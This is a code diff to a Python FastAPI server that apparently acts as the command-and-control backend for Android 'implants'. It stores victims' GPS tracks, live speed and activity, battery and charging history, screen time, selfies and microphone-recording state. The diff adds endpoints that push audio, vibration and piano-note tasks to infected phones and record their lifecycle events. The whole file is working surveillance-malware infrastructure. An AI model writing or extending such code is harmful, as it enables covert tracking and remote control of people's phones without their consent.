@@ -20,9 +20,11 @@ from fastapi import (
     Request, UploadFile, WebSocket, WebSocketDisconnect, status,
 )
 from fastapi.middleware.cors import CORSMiddleware
+from pydantic import BaseModel
 from fastapi.responses import (
     FileResponse, HTMLResponse, JSONResponse, RedirectResponse, StreamingResponse,
 )
+from fastapi.responses import PlainTextResponse
 from fastapi.staticfiles import StaticFiles
 
 
@@ -304,7 +306,8 @@ def init_db() -> None:
             level       INTEGER,
             timestamp   TEXT,
             unix_time   REAL,
-            gap_seconds INTEGER DEFAULT 0
+            gap_seconds INTEGER DEFAULT 0,
+            charging    INTEGER DEFAULT 0
         )
     """)
 
@@ -369,6 +372,7 @@ def init_db() -> None:
         "ALTER TABLE devices ADD COLUMN audio_playing      INTEGER DEFAULT 0",
         "ALTER TABLE selfies ADD COLUMN review_status      TEXT DEFAULT 'pending'",
         "ALTER TABLE selfies ADD COLUMN reviewed_at        TEXT DEFAULT NULL",
+        "ALTER TABLE battery_history ADD COLUMN charging   INTEGER DEFAULT 0",
     ]
     for stmt in migrations:
         _try_add_column(c, stmt)
@@ -475,6 +479,9 @@ class ConnectionManager:
 
 ws_manager: ConnectionManager = ConnectionManager()
 pending_location_checks: dict[str, asyncio.Future] = {}
+
+# Audio task queue tracking: device_id -> {task_id -> {type, volume, loops, status, created_at}}
+active_audio_tasks: dict[str, dict[int, dict]] = {}
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -676,6 +683,19 @@ async def lifespan(app: FastAPI):
 
 app = FastAPI(lifespan=lifespan)
 
+
+@app.exception_handler(Exception)
+async def global_exception_handler(request: Request, exc: Exception):
+    import traceback
+    print(f"[error] Unhandled exception: {exc}", flush=True)
+    traceback.print_exc()
+    # Return an empty streaming response (chunked) to avoid Content-Length mismatches
+    async def _empty_async_gen():
+        if False:
+            yield b""
+
+    return StreamingResponse(_empty_async_gen(), media_type="text/plain", status_code=500)
+
 # FIX R3-8: CORS origins are now configurable via CORS_ORIGINS env var (comma-separated).
 # Set CORS_ORIGINS="https://your-c2-domain.com" in production to enable session credentials.
 # The wildcard default is kept for local/dev deployments where credentials don't matter.
@@ -851,6 +871,23 @@ async def websocket_endpoint(websocket: WebSocket) -> None:
                             _c.execute("UPDATE devices SET notif_state=0 WHERE device_id=?", (ev_dev,))
                             db.commit()
                             await sse.broadcast("alert_dismissed", {"device_id": ev_dev})
+                        elif ev == "audio_task_started":
+                            task_id = data.get("task_id")
+                            if task_id and ev_dev in active_audio_tasks and task_id in active_audio_tasks[ev_dev]:
+                                active_audio_tasks[ev_dev][task_id]["status"] = "playing"
+                                await sse.broadcast("audio_task_started", {"device_id": ev_dev, "task_id": task_id})
+                        elif ev == "audio_task_completed":
+                            task_id = data.get("task_id")
+                            if task_id and ev_dev in active_audio_tasks and task_id in active_audio_tasks[ev_dev]:
+                                active_audio_tasks[ev_dev][task_id]["status"] = "completed"
+                                await sse.broadcast("audio_task_completed", {"device_id": ev_dev, "task_id": task_id})
+                        elif ev == "audio_task_failed":
+                            task_id = data.get("task_id")
+                            error_msg = data.get("error", "Unknown error")
+                            if task_id and ev_dev in active_audio_tasks and task_id in active_audio_tasks[ev_dev]:
+                                active_audio_tasks[ev_dev][task_id]["status"] = "failed"
+                                active_audio_tasks[ev_dev][task_id]["error"] = error_msg
+                                await sse.broadcast("audio_task_failed", {"device_id": ev_dev, "task_id": task_id, "error": error_msg})
                         print(f"[ipc] {ev_dev} → {ev}", flush=True)
                     continue
 
@@ -998,9 +1035,9 @@ async def websocket_endpoint(websocket: WebSocket) -> None:
                         last_batt = c.fetchone()
                         gap = int(now_unix - last_batt["unix_time"]) if last_batt else 0
                         c.execute(
-                            "INSERT INTO battery_history (device_id, level, timestamp, unix_time, gap_seconds)"
-                            " VALUES (?, ?, ?, ?, ?)",
-                            (client_id, battery_val, time_str, now_unix, gap),
+                            "INSERT INTO battery_history (device_id, level, timestamp, unix_time, gap_seconds, charging)"
+                            " VALUES (?, ?, ?, ?, ?, ?)",
+                            (client_id, battery_val, time_str, now_unix, gap, charging_val),
                         )
 
                     # Upsert devices row
@@ -1039,6 +1076,29 @@ async def websocket_endpoint(websocket: WebSocket) -> None:
                                 (client_id, date_str, screen_time_minutes, now_unix),
                             )
 
+                    live_speed_ms  = 0.0
+                    live_speed_kmh = 0.0
+                    live_activity  = "Stationary"
+
+                    # Compute live speed from GPS cache BEFORE updating the cache with the new point.
+                    if loc_state_val == 1 and "lat" in data and "lon" in data:
+                        try:
+                            cur_lat = float(lat_val)
+                            cur_lon = float(lon_val)
+                            if validate_coordinates(cur_lat, cur_lon):
+                                last_gps = _gps_last_point.get(client_id)
+                                if last_gps is not None:
+                                    last_lat, last_lon, last_t = last_gps
+                                    t_diff = now_unix - last_t
+                                    if t_diff >= 1.0:  # need at least 1s apart to avoid division noise
+                                        dist_m = haversine(last_lat, last_lon, cur_lat, cur_lon)
+                                        live_speed_ms  = round(dist_m / t_diff, 2)
+                                        live_speed_kmh = round(live_speed_ms * 3.6, 2)
+                                        if live_speed_ms > 1.5:
+                                            live_activity = "Moving"
+                        except (ValueError, TypeError):
+                            pass
+
                     # GPS history with deduplication
                     if loc_state_val == 1 and "lat" in data and "lon" in data:
                         try:
@@ -1076,6 +1136,9 @@ async def websocket_endpoint(websocket: WebSocket) -> None:
                         "unix_time":            now_unix,
                         "ws_connected":         True,
                         "is_online":            True,
+                        "speed_ms":             live_speed_ms,
+                        "speed_kmh":            live_speed_kmh,
+                        "activity":             live_activity,
                     })
 
             except WebSocketDisconnect:
@@ -1114,14 +1177,25 @@ async def sse_events(request: Request) -> StreamingResponse:
             # Send a hello so the browser knows the stream is live.
             yield "event: connected\ndata: {}\n\n"
             while True:
-                if await request.is_disconnected():
-                    break
                 try:
+                    if await request.is_disconnected():
+                        break
                     msg = await asyncio.wait_for(q.get(), timeout=25.0)
                     yield msg
                 except asyncio.TimeoutError:
                     # Keepalive comment — prevents proxies from closing idle streams.
                     yield ": ka\n\n"
+                except asyncio.CancelledError:
+                    break
+                except Exception as e:
+                    # Defensive: log and break rather than letting exceptions
+                    # propagate to Starlette's exception handler which can try
+                    # to send a full error response after part of the body
+                    # was already streamed (triggering Content-Length errors).
+                    print(f"[sse] generator exception: {e}", flush=True)
+                    import traceback
+                    traceback.print_exc()
+                    break
         finally:
             await sse.unsubscribe(q)
 
@@ -1231,6 +1305,10 @@ async def apps_view(request: Request):
 @app.get("/selfies_view")
 async def selfies_view(request: Request):
     return _serve_template(request, "selfies.html")
+
+@app.get("/piano_view")
+async def piano_view(request: Request):
+    return _serve_template(request, "piano.html")
 
 @app.get("/updater_status")
 async def updater_status(request: Request, db: sqlite3.Connection = Depends(get_db)):
@@ -1720,12 +1798,14 @@ async def get_stats(device_id: str, request: Request, db: sqlite3.Connection = D
         )
         points = c.fetchall()
         if len(points) == 2:
-            dist     = haversine(points[1]["lat"], points[1]["lon"], points[0]["lat"], points[0]["lon"])
-            time_diff = abs(points[0]["unix_time"] - points[1]["unix_time"])
-            if time_diff > 0:
+            p0_lat, p0_lon, p0_t = points[0]["lat"], points[0]["lon"], points[0]["unix_time"]
+            p1_lat, p1_lon, p1_t = points[1]["lat"], points[1]["lon"], points[1]["unix_time"]
+            dist     = haversine(p1_lat, p1_lon, p0_lat, p0_lon)
+            time_diff = abs(p0_t - p1_t)
+            if time_diff >= 1.0:  # require at least 1s apart to avoid division-by-zero noise
                 speed_ms  = round(dist / time_diff, 2)
                 speed_kmh = round(speed_ms * 3.6, 2)
-                if speed_ms > 1.5:  # above walking pace — not GPS drift
+                if speed_ms > 1.5:
                     activity_state = "Moving"
 
         if device_id in ws_manager.active_connections:
@@ -1782,7 +1862,7 @@ async def get_history(
             "SELECT lat, lon FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 500",
             (device_id,),
         )
-    return {"path": [[r["lat"], r["lon"]] for r in c.fetchall()]}
+    return {"path": [[r["lat"], r["lon"]] for r in c.fetchall()][::-1]}
 
 
 @app.get("/history_detailed")
@@ -1823,9 +1903,9 @@ async def get_history_detailed(
     history_data = []
     for i, r in enumerate(rows):
         speed = gap = 0
-        if i > 0:
-            prev = rows[i - 1]
-            gap  = int(prev["unix_time"] - r["unix_time"])
+        if i < len(rows) - 1:
+            prev = rows[i + 1]
+            gap  = int(r["unix_time"] - prev["unix_time"])
             if gap > 0:
                 dist_m = haversine(r["lat"], r["lon"], prev["lat"], prev["lon"])
                 speed  = round((dist_m / 1000) / (gap / 3600), 1)  # km/h
@@ -1857,7 +1937,7 @@ async def battery_history(
 
     if start_time and end_time:
         c.execute(
-            "SELECT level, timestamp, unix_time, gap_seconds FROM battery_history"
+            "SELECT level, timestamp, unix_time, gap_seconds, charging FROM battery_history"
             " WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?"
             " ORDER BY unix_time DESC LIMIT ? OFFSET ?",
             (device_id, start_time, end_time, per_page, offset),
@@ -1869,7 +1949,7 @@ async def battery_history(
         )
     else:
         c.execute(
-            "SELECT level, timestamp, unix_time, gap_seconds FROM battery_history"
+            "SELECT level, timestamp, unix_time, gap_seconds, charging FROM battery_history"
             " WHERE device_id = ? ORDER BY unix_time DESC LIMIT ? OFFSET ?",
             (device_id, per_page, offset),
         )
@@ -1880,7 +1960,8 @@ async def battery_history(
     return {
         "history": [
             {"level": r["level"], "time": r["timestamp"],
-             "unix_time": r["unix_time"], "gap_seconds": r["gap_seconds"]}
+             "unix_time": r["unix_time"], "gap_seconds": r["gap_seconds"],
+             "charging": r["charging"]}
             for r in rows
         ],
         "total": total, "page": page, "per_page": per_page,
@@ -2048,6 +2129,66 @@ async def audio_done(
     return {"status": "success"}
 
 
+@app.post("/ipc")
+async def ipc_event(
+    device_id: str = Form(...), implant_key: str = Form(...), event: str = Form(...),
+    task_id: str | None = Form(None), error: str | None = Form(None),
+    db: sqlite3.Connection = Depends(get_db),
+):
+    """Receives lifecycle IPC events (alert_shown, alert_dismissed, etc.) from the
+    device via HTTP POST. The simulator and real APK both use this endpoint."""
+    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
+        return JSONResponse({"status": "error", "message": "Unauthorized"}, status_code=403)
+    if not validate_device_id(device_id):
+        return JSONResponse({"status": "error", "message": "Invalid device_id"}, status_code=400)
+    c = db.cursor()
+    if event == "alert_shown":
+        c.execute("UPDATE devices SET notif_state=1 WHERE device_id=?", (device_id,))
+        db.commit()
+        await sse.broadcast("alert_shown", {"device_id": device_id})
+        print(f"[ipc] {device_id} → alert_shown", flush=True)
+    elif event == "alert_dismissed":
+        c.execute("UPDATE devices SET notif_state=0 WHERE device_id=?", (device_id,))
+        db.commit()
+        await sse.broadcast("alert_dismissed", {"device_id": device_id})
+        print(f"[ipc] {device_id} → alert_dismissed", flush=True)
+    elif event in ("audio_task_started", "audio_task_completed", "audio_task_failed", "audio_task_cancelled"):
+        # Handle queued audio lifecycle events coming from the simulator or reporter IPC
+        if task_id:
+            try:
+                tid = int(task_id)
+            except Exception:
+                tid = task_id
+            if device_id not in active_audio_tasks:
+                active_audio_tasks[device_id] = {}
+            if event == 'audio_task_started':
+                if tid in active_audio_tasks[device_id]:
+                    active_audio_tasks[device_id][tid]['status'] = 'playing'
+                await sse.broadcast('audio_task_started', {'device_id': device_id, 'task_id': tid})
+                print(f"[ipc] {device_id} → audio_task_started {tid}", flush=True)
+            elif event == 'audio_task_completed':
+                if tid in active_audio_tasks[device_id]:
+                    active_audio_tasks[device_id][tid]['status'] = 'completed'
+                await sse.broadcast('audio_task_completed', {'device_id': device_id, 'task_id': tid})
+                print(f"[ipc] {device_id} → audio_task_completed {tid}", flush=True)
+            elif event == 'audio_task_failed':
+                if tid in active_audio_tasks[device_id]:
+                    active_audio_tasks[device_id][tid]['status'] = 'failed'
+                    if error: active_audio_tasks[device_id][tid]['error'] = error
+                await sse.broadcast('audio_task_failed', {'device_id': device_id, 'task_id': tid, 'error': error or 'Unknown error'})
+                print(f"[ipc] {device_id} → audio_task_failed {tid}", flush=True)
+            elif event == 'audio_task_cancelled':
+                if tid in active_audio_tasks[device_id]:
+                    del active_audio_tasks[device_id][tid]
+                await sse.broadcast('audio_task_cancelled', {'device_id': device_id, 'task_id': tid})
+                print(f"[ipc] {device_id} → audio_task_cancelled {tid}", flush=True)
+        else:
+            print(f"[ipc] {device_id} → {event} (missing task_id)", flush=True)
+    else:
+        print(f"[ipc] {device_id} → unknown event: {event!r}", flush=True)
+    return {"status": "success"}
+
+
 # FIX R3-4: dedicated mic-record lifecycle endpoints so the server tracks when
 # microphone capture begins and ends (parallel to /audio_started + /audio_done).
 @app.post("/mic_record_started")
@@ -2104,6 +2245,24 @@ async def set_record_audio(
         c.execute("UPDATE devices SET record_audio=0 WHERE device_id=?", (device_id,))
         db.commit()
     return {"status": "success", "delivered": delivered}
+
+
+@app.post("/play_note")
+async def play_note(
+    request: Request = Depends(verify_session),
+    note: int = Form(...), velocity: int = Form(...), state: int = Form(...)
+):
+    """Broadcasts a MIDI note to all connected dashboards and active Android implants."""
+    payload = {"note": note, "velocity": velocity, "state": state}
+    
+    # Broadcast to all open Web UI dashboards via SSE
+    await sse.broadcast("piano_note", payload)
+    
+    # Broadcast to all connected Android implants
+    for client_id in ws_manager.active_connections:
+        await ws_manager.send_task(client_id, {"task": "piano_note", **payload})
+        
+    return {"status": "success"}
 
 
 @app.post("/set_power_cmd")
@@ -2631,3 +2790,246 @@ async def delete_selfie(
         c.execute("DELETE FROM selfies WHERE id = ?", (selfie_id,))
         db.commit()
     return {"status": "success"}
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Audio Queue Management API Endpoints
+# ══════════════════════════════════════════════════════════════════════════════
+
+class AudioQueueRequest(BaseModel):
+    type: int          # 1, 2, or 3
+    volume: float      # 0.0 to 1.0
+    loops: int         # 0 = infinite, >0 = count
+    vibrate_with_audio: bool = False
+    # Note: vibrate duration removed — backend only uses boolean flag
+
+
+@app.post("/api/devices/{device_id}/audio/queue")
+async def queue_audio_task(
+    device_id: str,
+    request_data: AudioQueueRequest,
+    request: Request = Depends(verify_session),
+):
+    """Queue an audio playback task. Returns task_id."""
+    if not validate_device_id(device_id):
+        raise HTTPException(status_code=400, detail="Invalid device_id")
+    
+    if request_data.type not in (1, 2, 3):
+        raise HTTPException(status_code=400, detail="Invalid audio type (must be 1, 2, or 3)")
+    
+    if not 0.0 <= request_data.volume <= 1.0:
+        raise HTTPException(status_code=400, detail="Volume must be between 0.0 and 1.0")
+    
+    # Generate task_id
+    task_id = int(time.time() * 1000 + secrets.randbelow(1000))
+    
+    # Initialize device tracking if needed
+    if device_id not in active_audio_tasks:
+        active_audio_tasks[device_id] = {}
+    
+    # Check queue size limit
+    if len(active_audio_tasks[device_id]) >= 50:
+        raise HTTPException(status_code=429, detail="Audio queue full (max 50 tasks)")
+    
+    # Record task
+    active_audio_tasks[device_id][task_id] = {
+        "type": request_data.type,
+        "volume": request_data.volume,
+        "loops": request_data.loops,
+        "vibrate_with_audio": bool(request_data.vibrate_with_audio),
+        "status": "pending",
+        "created_at": time.time(),
+    }
+    
+    # Send task to device if connected
+    if device_id in ws_manager.active_connections:
+        payload = {
+            "task": "audio_play",
+            "type": request_data.type,
+            "volume": request_data.volume,
+            "loops": request_data.loops,
+            "task_id": task_id,
+        }
+        if request_data.vibrate_with_audio:
+            payload["vibrate_with_audio"] = True
+        await ws_manager.send_task(device_id, payload)
+    
+    await sse.broadcast("audio_task_queued", {
+        "device_id": device_id,
+        "task_id": task_id,
+        "type": request_data.type,
+        "volume": request_data.volume,
+    })
+    
+    return {
+        "status": "queued",
+        "task_id": task_id,
+        "queue_size": len(active_audio_tasks[device_id]),
+    }
+
+
+@app.post("/api/devices/{device_id}/vibrate")
+async def queue_vibrate_task(
+    device_id: str,
+    request: Request,
+    auth: bool = Depends(verify_session),
+):
+    """Queue a vibration-only task. Body: {"duration": <seconds>}"""
+    if not validate_device_id(device_id):
+        raise HTTPException(status_code=400, detail="Invalid device_id")
+    # Try JSON first
+    try:
+        body = await request.json()
+        duration = int(body.get('duration', 1))
+    except Exception:
+        # Then try form-encoded (curl -d or form submit)
+        try:
+            form = await request.form()
+            if 'duration' in form:
+                duration = int(form.get('duration'))
+            else:
+                # Lastly, check query params or default
+                q = request.query_params.get('duration')
+                duration = int(q) if q else 2
+        except Exception:
+            # Fallback default
+            duration = 2
+    if duration < 1 or duration > 3600:
+        raise HTTPException(status_code=400, detail="Duration must be 1-3600 seconds")
+
+    # Generate task_id
+    task_id = int(time.time() * 1000 + secrets.randbelow(1000))
+    if device_id not in active_audio_tasks:
+        active_audio_tasks[device_id] = {}
+    if len(active_audio_tasks[device_id]) >= 50:
+        raise HTTPException(status_code=429, detail="Audio queue full (max 50 tasks)")
+
+    active_audio_tasks[device_id][task_id] = {
+        "type": "vibrate",
+        "volume": 0,
+        "loops": 0,
+        "duration": duration,
+        "status": "pending",
+        "created_at": time.time(),
+    }
+
+    # Send to device if connected
+    if device_id in ws_manager.active_connections:
+        await ws_manager.send_task(device_id, {"task": "vibrate", "duration": duration, "task_id": task_id})
+
+    await sse.broadcast("audio_task_queued", {"device_id": device_id, "task_id": task_id, "type": "vibrate", "volume": 0})
+
+    return {"status": "queued", "task_id": task_id, "queue_size": len(active_audio_tasks[device_id])}
+
+
+@app.get("/api/devices/{device_id}/audio/queue")
+async def get_audio_queue_status(
+    device_id: str,
+    request: Request = Depends(verify_session),
+):
+    """Get current audio queue status for a device."""
+    if not validate_device_id(device_id):
+        raise HTTPException(status_code=400, detail="Invalid device_id")
+    
+    if device_id not in active_audio_tasks:
+        return {
+            "device_id": device_id,
+            "queue_size": 0,
+            "pending_tasks": [],
+            "max_queue_size": 50,
+        }
+    
+    tasks = active_audio_tasks[device_id]
+    pending_tasks = [
+        {
+            "task_id": tid,
+            "type": t["type"],
+            "volume": t["volume"],
+            "loops": t["loops"],
+            "status": t["status"],
+            "created_at": t["created_at"],
+        }
+        for tid, t in tasks.items()
+    ]
+    
+    return {
+        "device_id": device_id,
+        "queue_size": len(tasks),
+        "pending_tasks": pending_tasks,
+        "max_queue_size": 50,
+    }
+
+
+@app.post("/api/devices/{device_id}/audio/queue/{task_id}/cancel")
+async def cancel_audio_task(
+    device_id: str,
+    task_id: int,
+    request: Request = Depends(verify_session),
+):
+    """Cancel a specific audio task by ID."""
+    if not validate_device_id(device_id):
+        raise HTTPException(status_code=400, detail="Invalid device_id")
+    
+    if device_id not in active_audio_tasks or task_id not in active_audio_tasks[device_id]:
+        raise HTTPException(status_code=404, detail="Task not found")
+    
+    task = active_audio_tasks[device_id][task_id]
+    task["status"] = "cancelled"
+    
+    # Send cancel command to device if connected
+    if device_id in ws_manager.active_connections:
+        await ws_manager.send_task(
+            device_id,
+            {
+                "task": "audio_cancel",
+                "task_id": task_id,
+            }
+        )
+    
+    await sse.broadcast("audio_task_cancelled", {
+        "device_id": device_id,
+        "task_id": task_id,
+    })
+    
+    return {
+        "status": "cancelled",
+        "task_id": task_id,
+    }
+
+
+@app.post("/api/devices/{device_id}/audio/queue/clear")
+async def clear_audio_queue(
+    device_id: str,
+    request: Request = Depends(verify_session),
+):
+    """Clear all pending audio tasks for a device."""
+    if not validate_device_id(device_id):
+        raise HTTPException(status_code=400, detail="Invalid device_id")
+    
+    if device_id not in active_audio_tasks:
+        return {
+            "status": "cleared",
+            "cleared_tasks": 0,
+        }
+    
+    cleared_count = len(active_audio_tasks[device_id])
+    active_audio_tasks[device_id] = {}
+    
+    # Send clear command to device if connected
+    if device_id in ws_manager.active_connections:
+        await ws_manager.send_task(
+            device_id,
+            {
+                "task": "audio_clear_queue",
+            }
+        )
+    
+    await sse.broadcast("audio_queue_cleared", {
+        "device_id": device_id,
+        "cleared_tasks": cleared_count,
+    })
+    
+    return {
+        "status": "cleared",
+        "cleared_tasks": cleared_count,
+    }
